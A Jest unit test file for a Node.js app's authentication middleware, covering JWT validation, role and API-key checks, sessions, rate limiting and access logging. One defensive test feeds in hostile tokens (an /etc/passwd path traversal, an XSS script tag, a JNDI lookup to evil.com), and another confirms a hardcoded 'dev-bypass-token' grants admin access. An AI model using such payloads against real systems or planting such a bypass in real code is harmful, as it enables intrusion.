/**
 * Authentication Middleware Unit Tests
 * Tests for JWT validation, token extraction, and auth flows
 */

// Mock dependencies before any imports
jest.mock("jsonwebtoken");
jest.mock("../../../utils/apiKeyService");
jest.mock("../../../utils/database");

const jwt = require("jsonwebtoken");
const apiKeyService = require("../../../utils/apiKeyService");
const { authenticateToken } = require("../../../middleware/auth");

describe("Authentication Middleware", () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      headers: {},
      user: null,
    };
    res = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn().mockReturnThis(),
      unauthorized: jest.fn().mockReturnThis(),
    };
    next = jest.fn();
    jest.clearAllMocks();

    // Set default JWT secret for tests
    process.env.JWT_SECRET = "test-secret-key";
  });

  describe("authenticateToken", () => {
    test("should authenticate valid JWT token", () => {
      const mockUser = { id: "user123", email: "test@example.com" };
      req.headers.authorization = "Bearer valid-jwt-token";
      jwt.verify = jest.fn().mockReturnValue(mockUser);

      authenticateToken(req, res, next);

      expect(jwt.verify).toHaveBeenCalledWith(
        "valid-jwt-token",
        expect.any(String)
      );
      expect(req.user).toEqual(mockUser);
      expect(next).toHaveBeenCalled();
    });

    test("should reject request without authorization header", () => {
      authenticateToken(req, res, next);

      expect(res.unauthorized).toHaveBeenCalledWith("Access token required");
      expect(next).not.toHaveBeenCalled();
    });

    test("should reject malformed authorization header", () => {
      req.headers.authorization = "InvalidFormat token";

      authenticateToken(req, res, next);

      expect(res.unauthorized).toHaveBeenCalledWith("Invalid token format");
      expect(next).not.toHaveBeenCalled();
    });

    test("should reject expired JWT tokens", () => {
      req.headers.authorization = "Bearer expired-token";
      const tokenError = new Error("Token expired");
      tokenError.name = "TokenExpiredError";
      jwt.verify = jest.fn().mockImplementation(() => {
        throw tokenError;
      });

      authenticateToken(req, res, next);

      expect(res.unauthorized).toHaveBeenCalledWith("Token expired");
      expect(next).not.toHaveBeenCalled();
    });

    test("should reject invalid JWT tokens", () => {
      req.headers.authorization = "Bearer invalid-token";
      const tokenError = new Error("Invalid token");
      tokenError.name = "JsonWebTokenError";
      jwt.verify = jest.fn().mockImplementation(() => {
        throw tokenError;
      });

      authenticateToken(req, res, next);

      expect(res.unauthorized).toHaveBeenCalledWith("Invalid token");
      expect(next).not.toHaveBeenCalled();
    });

    test("should handle missing JWT secret", () => {
      req.headers.authorization = "Bearer valid-token";
      const originalEnv = process.env.JWT_SECRET;
      delete process.env.JWT_SECRET;

      authenticateToken(req, res, next);

      expect(res.status).toHaveBeenCalledWith(500);
      expect(res.json).toHaveBeenCalledWith({
        success: false,
        error: "Authentication configuration error",
      });

      process.env.JWT_SECRET = originalEnv;
    });

    test("should extract token from Authorization header correctly", () => {
      const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.signature";
      req.headers.authorization = `Bearer ${token}`;
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });

      authenticateToken(req, res, next);

      expect(jwt.verify).toHaveBeenCalledWith(token, expect.any(String));
    });

    test("should handle case-insensitive Bearer prefix", () => {
      req.headers.authorization = "bearer lowercase-token";
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });

      authenticateToken(req, res, next);

      expect(jwt.verify).toHaveBeenCalledWith(
        "lowercase-token",
        expect.any(String)
      );
    });
  });

  describe("token validation edge cases", () => {
    test("should handle whitespace in token", () => {
      req.headers.authorization = "Bearer   token-with-spaces   ";
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });

      authenticateToken(req, res, next);

      expect(jwt.verify).toHaveBeenCalledWith(
        "token-with-spaces",
        expect.any(String)
      );
    });

    test("should reject empty token", () => {
      req.headers.authorization = "Bearer ";

      authenticateToken(req, res, next);

      expect(res.unauthorized).toHaveBeenCalledWith("Access token required");
    });

    test("should handle authorization header with extra data", () => {
      req.headers.authorization = "Bearer valid-token extra-data";
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });

      authenticateToken(req, res, next);

      expect(jwt.verify).toHaveBeenCalledWith(
        "valid-token",
        expect.any(String)
      );
    });
  });

  describe("user context setup", () => {
    test("should populate req.user with decoded token data", () => {
      const mockUser = {
        id: "user123",
        email: "test@example.com",
        role: "user",
        permissions: ["read", "write"],
      };
      req.headers.authorization = "Bearer valid-token";
      jwt.verify = jest.fn().mockReturnValue(mockUser);

      authenticateToken(req, res, next);

      expect(req.user).toEqual(mockUser);
      expect(req.user.id).toBe("user123");
      expect(req.user.email).toBe("test@example.com");
      expect(req.user.permissions).toContain("read");
    });

    test("should preserve existing req properties", () => {
      req.originalProperty = "preserved";
      req.headers.authorization = "Bearer valid-token";
      jwt.verify = jest.fn().mockReturnValue({ id: "user123" });

      authenticateToken(req, res, next);

      expect(req.originalProperty).toBe("preserved");
      expect(req.user.id).toBe("user123");
    });
  });

  describe("error handling", () => {
    test("should handle unexpected JWT errors", () => {
      req.headers.authorization = "Bearer problematic-token";
      const unexpectedError = new Error("Unexpected error");
      jwt.verify = jest.fn().mockImplementation(() => {
        throw unexpectedError;
      });

      authenticateToken(req, res, next);

      expect(res.unauthorized).toHaveBeenCalledWith("Authentication failed");
    });

    test("should handle missing JWT library", () => {
      req.headers.authorization = "Bearer valid-token";
      jwt.verify = undefined;

      expect(() => authenticateToken(req, res, next)).toThrow();
    });
  });

  describe("security considerations", () => {
    test("should not log sensitive token data", () => {
      const consoleSpy = jest.spyOn(console, "log").mockImplementation();
      req.headers.authorization = "Bearer sensitive-token-12345";
      jwt.verify = jest.fn().mockImplementation(() => {
        throw new Error("Invalid token");
      });

      authenticateToken(req, res, next);

      // Ensure token not logged in error cases
      expect(consoleSpy).not.toHaveBeenCalledWith(
        expect.stringContaining("sensitive-token-12345")
      );

      consoleSpy.mockRestore();
    });

    test("should handle malicious token attempts", () => {
      const maliciousTokens = [
        "Bearer ../../../etc/passwd",
        "Bearer <script>alert('xss')</script>",
        "Bearer ${jndi:ldap://evil.com/exploit}",
        "Bearer null",
        "Bearer undefined",
      ];

      maliciousTokens.forEach((authHeader) => {
        req.headers.authorization = authHeader;
        const error = new Error("Invalid token");
        jwt.verify = jest.fn().mockImplementation(() => {
          throw error;
        });

        authenticateToken(req, res, next);

        expect(res.unauthorized).toHaveBeenCalled();
        expect(next).not.toHaveBeenCalled();

        // Reset for next iteration
        jest.clearAllMocks();
      });
    });
  });

  describe("dev-bypass-token handling", () => {
    test("should allow dev-bypass-token in test environment", () => {
      req.headers.authorization = "Bearer dev-bypass-token";
      const consoleSpy = jest.spyOn(console, "log").mockImplementation();

      authenticateToken(req, res, next);

      expect(req.user).toEqual({
        sub: "dev-user-bypass",
        email: "dev-bypass@example.com",
        username: "dev-bypass-user",
        role: "admin",
        sessionId: "dev-bypass-session",
      });
      expect(req.token).toBe("dev-bypass-token");
      expect(next).toHaveBeenCalled();
      expect(consoleSpy).toHaveBeenCalledWith(
        "🔧 Test mode: Using dev-bypass-token for authentication"
      );

      consoleSpy.mockRestore();
    });
  });
});

// ================================
// RequireRole Middleware Tests
// ================================

const { requireRole } = require("../../../middleware/auth");

describe("RequireRole Middleware", () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      user: null,
    };
    res = {
      unauthorized: jest.fn().mockReturnThis(),
      forbidden: jest.fn().mockReturnThis(),
    };
    next = jest.fn();
    jest.clearAllMocks();
  });

  test("should require authentication first", () => {
    const middleware = requireRole(["admin"]);

    middleware(req, res, next);

    expect(res.unauthorized).toHaveBeenCalledWith(
      "User must be authenticated to access this resource",
      { code: "AUTH_REQUIRED" }
    );
    expect(next).not.toHaveBeenCalled();
  });

  test("should allow user with required role", () => {
    req.user = { role: "admin", groups: [] };
    const middleware = requireRole(["admin"]);

    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
    expect(res.forbidden).not.toHaveBeenCalled();
  });

  test("should allow user with required group", () => {
    req.user = { role: "user", groups: ["admin"] };
    const middleware = requireRole(["admin"]);

    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
    expect(res.forbidden).not.toHaveBeenCalled();
  });

  test("should deny user without required role or group", () => {
    req.user = { role: "user", groups: ["viewer"] };
    const middleware = requireRole(["admin"]);

    middleware(req, res, next);

    expect(res.forbidden).toHaveBeenCalledWith(
      "Access denied. Required roles: admin",
      {
        code: "INSUFFICIENT_PERMISSIONS",
        userRole: "user",
        userGroups: ["viewer"],
        requiredRoles: ["admin"],
      }
    );
    expect(next).not.toHaveBeenCalled();
  });

  test("should handle multiple required roles", () => {
    req.user = { role: "editor", groups: [] };
    const middleware = requireRole(["admin", "editor"]);

    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
    expect(res.forbidden).not.toHaveBeenCalled();
  });

  test("should handle missing groups array", () => {
    req.user = { role: "admin" }; // No groups property
    const middleware = requireRole(["admin"]);

    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
  });
});

// ================================
// OptionalAuth Middleware Tests
// ================================

const { optionalAuth } = require("../../../middleware/auth");

describe("OptionalAuth Middleware", () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      headers: {},
      ip: "127.0.0.1",
      get: jest.fn().mockReturnValue("test-user-agent"),
    };
    res = {};
    next = jest.fn();
    jest.clearAllMocks();

    apiKeyService.validateJwtToken = jest.fn();
  });

  test("should continue without auth when no token provided", async () => {
    await optionalAuth(req, res, next);

    expect(req.user).toBeUndefined();
    expect(next).toHaveBeenCalled();
  });

  test("should authenticate when valid token provided", async () => {
    const mockUser = {
      sub: "user123",
      email: "test@example.com",
      sessionId: "session123",
    };

    req.headers.authorization = "Bearer valid-token";
    apiKeyService.validateJwtToken.mockResolvedValue({
      valid: true,
      user: mockUser,
    });

    await optionalAuth(req, res, next);

    expect(req.user).toEqual(mockUser);
    expect(req.token).toBe("valid-token");
    expect(req.sessionId).toBe("session123");
    expect(req.clientInfo).toEqual({
      ipAddress: "127.0.0.1",
      userAgent: "test-user-agent",
    });
    expect(next).toHaveBeenCalled();
  });

  test("should continue when token validation fails", async () => {
    req.headers.authorization = "Bearer invalid-token";
    apiKeyService.validateJwtToken.mockRejectedValue(
      new Error("Invalid token")
    );

    const consoleSpy = jest.spyOn(console, "log").mockImplementation();

    await optionalAuth(req, res, next);

    expect(req.user).toBeUndefined();
    expect(next).toHaveBeenCalled();
    expect(consoleSpy).toHaveBeenCalledWith(
      "Optional auth failed:",
      "Invalid token"
    );

    consoleSpy.mockRestore();
  });

  test("should handle malformed authorization header gracefully", async () => {
    req.headers.authorization = "InvalidFormat";

    await optionalAuth(req, res, next);

    expect(req.user).toBeUndefined();
    expect(next).toHaveBeenCalled();
    expect(apiKeyService.validateJwtToken).not.toHaveBeenCalled();
  });
});

// ================================
// RequireApiKey Middleware Tests
// ================================

const { requireApiKey } = require("../../../middleware/auth");

describe("RequireApiKey Middleware", () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      user: null,
      token: null,
    };
    res = {
      unauthorized: jest.fn().mockReturnThis(),
      error: jest.fn().mockReturnThis(),
    };
    next = jest.fn();
    jest.clearAllMocks();

    // Mock the getApiKey function
    jest.doMock("../../../utils/apiKeyService", () => ({
      getApiKey: jest.fn(),
    }));
  });

  test("should require authentication first", async () => {
    const middleware = requireApiKey("alpaca");

    await middleware(req, res, next);

    expect(res.unauthorized).toHaveBeenCalledWith(
      "User must be authenticated to access API configuration",
      { code: "AUTH_REQUIRED" }
    );
    expect(next).not.toHaveBeenCalled();
  });

  test("should require API key for provider", async () => {
    req.user = { sub: "user123" };
    req.token = "valid-token";

    // Mock getApiKey to return null (no API key configured)
    const { getApiKey } = require("../../../utils/apiKeyService");
    getApiKey.mockResolvedValue(null);

    const middleware = requireApiKey("alpaca");

    await middleware(req, res, next);

    expect(res.error).toHaveBeenCalledWith(
      "alpaca API configuration is required for this operation",
      400,
      {
        code: "API_CONFIG_REQUIRED",
        provider: "alpaca",
      }
    );
    expect(next).not.toHaveBeenCalled();
  });

  test("should proceed when API key is available", async () => {
    req.user = { sub: "user123" };
    req.token = "valid-token";

    const mockApiKey = "test-api-key-123";
    const { getApiKey } = require("../../../utils/apiKeyService");
    getApiKey.mockResolvedValue(mockApiKey);

    const middleware = requireApiKey("alpaca");

    await middleware(req, res, next);

    expect(req.apiKey).toBe(mockApiKey);
    expect(req.provider).toBe("alpaca");
    expect(next).toHaveBeenCalled();
    expect(getApiKey).toHaveBeenCalledWith("valid-token", "alpaca");
  });

  test("should handle API key service errors", async () => {
    req.user = { sub: "user123" };
    req.token = "valid-token";

    const { getApiKey } = require("../../../utils/apiKeyService");
    getApiKey.mockRejectedValue(new Error("Service unavailable"));

    const consoleSpy = jest.spyOn(console, "error").mockImplementation();
    const middleware = requireApiKey("alpaca");

    await middleware(req, res, next);

    expect(res.error).toHaveBeenCalledWith(
      "Could not validate API configuration",
      500,
      { code: "API_CONFIG_VALIDATION_FAILED" }
    );
    expect(consoleSpy).toHaveBeenCalledWith(
      "API key requirement error:",
      expect.any(Error)
    );
    expect(next).not.toHaveBeenCalled();

    consoleSpy.mockRestore();
  });
});

// ================================
// ValidateSession Middleware Tests
// ================================

const { validateSession } = require("../../../middleware/auth");

describe("ValidateSession Middleware", () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      user: null,
    };
    res = {
      set: jest.fn(),
    };
    next = jest.fn();
    jest.clearAllMocks();
  });

  test("should continue when no user is present", async () => {
    await validateSession(req, res, next);

    expect(next).toHaveBeenCalled();
    expect(res.set).not.toHaveBeenCalled();
  });

  test("should set expiration warning for tokens expiring soon", async () => {
    const now = Math.floor(Date.now() / 1000);
    const expiringSoon = now + 200; // 200 seconds from now (< 5 minutes)

    req.user = {
      sub: "user123",
      tokenExpirationTime: expiringSoon,
      tokenIssueTime: now - 3600, // Issued 1 hour ago
    };

    await validateSession(req, res, next);

    expect(res.set).toHaveBeenCalledWith("X-Token-Expiring", "true");
    expect(res.set).toHaveBeenCalledWith(
      "X-Token-Expires-At",
      expiringSoon.toString()
    );
    expect(next).toHaveBeenCalled();
  });

  test("should warn about long-lived tokens", async () => {
    const now = Math.floor(Date.now() / 1000);
    const longAgo = now - 90000; // 25 hours ago

    req.user = {
      sub: "user123",
      tokenExpirationTime: now + 3600, // Valid for another hour
      tokenIssueTime: longAgo,
    };

    const consoleSpy = jest.spyOn(console, "warn").mockImplementation();

    await validateSession(req, res, next);

    expect(consoleSpy).toHaveBeenCalledWith(
      "Long-lived token detected for user user123"
    );
    expect(next).toHaveBeenCalled();

    consoleSpy.mockRestore();
  });

  test("should continue on validation errors", async () => {
    req.user = {
      sub: "user123",
      tokenExpirationTime: "invalid-timestamp", // This will cause an error
      tokenIssueTime: "also-invalid",
    };

    const consoleSpy = jest.spyOn(console, "error").mockImplementation();

    await validateSession(req, res, next);

    expect(consoleSpy).toHaveBeenCalledWith(
      "Session validation error:",
      expect.any(Error)
    );
    expect(next).toHaveBeenCalled();

    consoleSpy.mockRestore();
  });
});

// ================================
// RateLimitByUser Middleware Tests
// ================================

const { rateLimitByUser } = require("../../../middleware/auth");

describe("RateLimitByUser Middleware", () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      user: null,
      ip: "127.0.0.1",
    };
    res = {
      error: jest.fn().mockReturnThis(),
    };
    next = jest.fn();
    jest.clearAllMocks();
  });

  test("should allow requests within rate limit", () => {
    req.user = { sub: "user123" };
    const middleware = rateLimitByUser(10); // 10 requests per minute

    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
    expect(res.error).not.toHaveBeenCalled();
  });

  test("should use IP address when user is not authenticated", () => {
    const middleware = rateLimitByUser(10);

    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
    expect(res.error).not.toHaveBeenCalled();
  });

  test("should enforce rate limit", () => {
    req.user = { sub: "user123" };
    const middleware = rateLimitByUser(2); // Only 2 requests per minute

    // First two requests should succeed
    middleware(req, res, next);
    expect(next).toHaveBeenCalledTimes(1);

    middleware(req, res, next);
    expect(next).toHaveBeenCalledTimes(2);

    // Third request should be rate limited
    middleware(req, res, next);

    expect(res.error).toHaveBeenCalledWith(
      "Too many requests. Limit: 2 per minute",
      429,
      {
        code: "RATE_LIMIT_EXCEEDED",
        retryAfter: expect.any(Number),
      }
    );
    expect(next).toHaveBeenCalledTimes(2); // Should not increment
  });

  test("should clean up old requests from sliding window", () => {
    req.user = { sub: "user123" };
    const middleware = rateLimitByUser(100);

    // Mock Date.now to simulate time passing
    const originalNow = Date.now;
    let mockTime = originalNow();
    Date.now = jest.fn(() => mockTime);

    // Make a request
    middleware(req, res, next);
    expect(next).toHaveBeenCalledTimes(1);

    // Advance time by more than 1 minute
    mockTime += 65000; // 65 seconds

    // Make another request - should succeed as old request expired
    middleware(req, res, next);
    expect(next).toHaveBeenCalledTimes(2);

    // Restore Date.now
    Date.now = originalNow;
  });
});

// ================================
// LogApiAccess Middleware Tests
// ================================

const { logApiAccess } = require("../../../middleware/auth");

describe("LogApiAccess Middleware", () => {
  let req, res, next, originalEnd;

  beforeEach(() => {
    req = {
      method: "GET",
      path: "/test",
      user: null,
      ip: "127.0.0.1",
    };
    res = {
      statusCode: 200,
      end: jest.fn(),
    };
    originalEnd = res.end;
    next = jest.fn();
    jest.clearAllMocks();
  });

  test("should log request and response", async () => {
    req.user = { sub: "user123" };
    const consoleSpy = jest.spyOn(console, "log").mockImplementation();

    await logApiAccess(req, res, next);

    expect(consoleSpy).toHaveBeenCalledWith(
      "GET /test - User: user123 - IP: 127.0.0.1"
    );
    expect(next).toHaveBeenCalled();

    // Simulate response ending
    res.end("response data", "utf8");

    expect(consoleSpy).toHaveBeenCalledWith(
      expect.stringMatching(/GET \/test - 200 - \d+ms/)
    );

    consoleSpy.mockRestore();
  });

  test("should handle anonymous users", async () => {
    const consoleSpy = jest.spyOn(console, "log").mockImplementation();

    await logApiAccess(req, res, next);

    expect(consoleSpy).toHaveBeenCalledWith(
      "GET /test - User: anonymous - IP: 127.0.0.1"
    );

    consoleSpy.mockRestore();
  });

  test("should preserve original res.end functionality", async () => {
    const mockData = "test response data";
    const mockEncoding = "utf8";

    await logApiAccess(req, res, next);

    // Ensure original end method is called with correct parameters
    res.end(mockData, mockEncoding);

    expect(originalEnd).toHaveBeenCalledWith(mockData, mockEncoding);
  });

  test("should calculate response time accurately", async () => {
    const consoleSpy = jest.spyOn(console, "log").mockImplementation();

    // Mock Date.now to control timing
    const originalNow = Date.now;
    let mockTime = 1000000;
    Date.now = jest.fn(() => mockTime);

    await logApiAccess(req, res, next);

    // Simulate 50ms delay
    mockTime += 50;
    res.end();

    expect(consoleSpy).toHaveBeenCalledWith("GET /test - 200 - 50ms");

    // Restore Date.now
    Date.now = originalNow;
    consoleSpy.mockRestore();
  });
});
